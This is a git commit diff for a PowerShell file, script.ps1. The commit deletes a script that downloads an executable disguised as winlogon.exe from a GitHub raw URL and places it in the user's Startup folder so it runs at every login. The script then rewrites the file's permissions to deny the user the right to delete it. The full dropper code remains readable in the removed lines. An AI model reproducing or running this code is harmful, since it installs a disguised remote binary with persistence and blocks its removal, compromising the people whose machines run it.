b6802e89f71f2e6b520a89ff9a1aff520909f737
FoxGist <132152738+FoxGist@users.noreply.github.com>
2023-05-02 22:24:57 +0000

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,16 +1,1 @@
-$URL = "https://github.com/FoxGist/FoxGist/raw/main/winlogon.exe"
-$DestPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winlogon.exe"
 
-if (!(Test-Path -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")) {
-    New-Item -ItemType Directory -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-}
-
-$WebClient = New-Object System.Net.WebClient
-$WebClient.DownloadFile($URL, $DestPath)
-
-$Acl = Get-Acl -Path $DestPath
-$Ar = New-Object System.Security.AccessControl.FileSystemAccessRule($env:USERNAME,"ReadAndExecute","Allow")
-$Acl.SetAccessRule($Ar)
-$Ad = New-Object System.Security.AccessControl.FileSystemAccessRule($env:USERNAME,"Delete","Deny")
-$Acl.SetAccessRule($Ad)
-Set-Acl -Path $DestPath -AclObject $Acl
